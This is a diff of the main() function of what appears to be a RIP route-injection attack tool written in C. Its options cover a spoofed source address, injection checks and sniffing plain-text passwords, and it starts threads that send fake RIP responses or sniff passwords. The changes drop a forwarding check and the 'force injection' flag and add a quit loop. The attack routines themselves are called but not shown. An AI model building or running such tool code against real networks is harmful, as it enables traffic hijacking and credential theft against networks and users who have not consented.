@@ -13,11 +13,11 @@ static struct neo_options opt[] = {
   {'s', required_argument, NULL, "address", "spoofed source"},
   {'p', required_argument, NULL, "passwd", "password for autentication"},
   {'+', 0, "s|ar", 0, 0},
-  {'x', no_argument, "x/xarbngd", "address", "spoofed source"},
+  {'x', no_argument, "x/xarbngd", "sniff", "sniff plain text password"},
   {'h', no_argument, NULL, NULL, "print help"},
   {'d', no_argument, "d/dc", NULL, "daemonize"},
   {'c', no_argument, "c/cd", NULL, "check injection"},
-  {'f', no_argument, NULL, NULL, "force injection"},
+  {'+', 0, "|arbx", 0, 0},
   {0, 0, 0, 0, 0}
 };
 
@@ -26,7 +26,8 @@ main (int argc, char **argv)
 {
   unsigned long sp00f = 0;
   char ch, subnet[16];
-  
+  pthread_t pt, pt1;
+
   credits ();
   init_all ();
 
@@ -48,8 +49,8 @@ main (int argc, char **argv)
 	  break;
 	case 'p':
 	  strncpy (password, neoptarg, 16);
-          flags ^= PASS;
-          break;  
+	  flags ^= PASS;
+	  break;
 	case 'r':
 	  routes[0][0] = inet_addr (neoptarg);
 	  break;
@@ -72,72 +73,81 @@ main (int argc, char **argv)
 	case 'd':
 	  flags ^= DAEMON;
 	  break;
-	case 'f':
-	  flags ^= FORCE;
-	  break;
 	case 'c':
 	  flags ^= CHECK;
 	  break;
 	}
     }
 
-    if (flags & DAEMON)
-      {
-        if (fork ())
-          exit (0);
-      }
-    else
-       printf ("\nPress 'q' and Enter to exit\n\n");
-  
   if (flags & SCAN)
     {
       scan_net (subnet);
       exit (0);
     }
-  if (flags & SNIFF)
+ 
+  if (flags & DAEMON)
     {
-      if (pthread_create (&pt, NULL, (void *) sniff_passwd, NULL))
-        fatal("Cannot create pthread!\n\n");
-      wait();
-      exit(0);
+      if (fork ())
+	exit (0);
     }
-  if (!routes[0][0])
-    usage (argv[0]);
-  if (!(flags & FORCE))
-    check_forward ();
+  else
+    printf ("\nPress 'q' and Enter to exit\n\n");
+
+//  if ((!routes[0][0]) && (!(flags & SNIFF)))
+//    usage (argv[0]);
+  
   if (flags & SPOOF)
     localaddr = sp00f;
+  
   if (flags & PASS)
     {
       if (pthread_create (&pt, NULL, (void *) auth_pass, NULL))
-	fatal("Cannot create pthread!\n\n");
+	fatal ("Cannot create pthread!\n\n");
     }
-  else 
+  if (flags & SNIFF)
+    {
+      if (pthread_create (&pt, NULL, (void *) sniff_passwd, NULL))
+      fatal ("Cannot create pthread!\n\n");
+    }
+  else
     {
       if (pthread_create (&pt, NULL, (void *) send_fake_rip_response, NULL))
-	fatal("Cannot create pthread!\n\n");
-    } 
+	fatal ("Cannot create pthread!\n\n");
+    }
   if (flags & CHECK)
     {
-      if (flags & PASS) {
-        if (pthread_create (&pt1, NULL, (void *) check_injection_crypt, NULL))
-          {
-            fprintf (stderr, "\nerror while creating the pthread\n");
-            pthread_cancel (pt);
-            pthread_join (pt, NULL);
-            exit (1);
-          }
-      } else {
-        if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
-	  {
-	    fprintf (stderr, "\nerror while creating the pthread\n");
-	    pthread_cancel (pt);
-	    pthread_join (pt, NULL);
-	    exit (1);
-	  }
-      }
+      if (flags & PASS)
+	{
+	  if (pthread_create
+	      (&pt1, NULL, (void *) check_injection_crypt, NULL))
+	    {
+	      fprintf (stderr, "\nerror while creating the pthread\n");
+	      pthread_cancel (pt);
+	      pthread_join (pt, NULL);
+	      exit (1);
+	    }
+	}
+      else
+	{
+	  if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
+	    {
+	      fprintf (stderr, "\nerror while creating the pthread\n");
+	      pthread_cancel (pt);
+	      pthread_join (pt, NULL);
+	      exit (1);
+	    }
+	}
     }
-  wait();
-  
+  while ((char) getchar () != 'q');
+
+  fprintf (stderr, "\nExiting...\n");
+  pthread_cancel (pt);
+  pthread_join (pt, NULL);
+  if (flags & CHECK)
+    {
+      pthread_cancel (pt1);
+      pthread_join (pt1, NULL);
+    }
+
   return 0;
 }
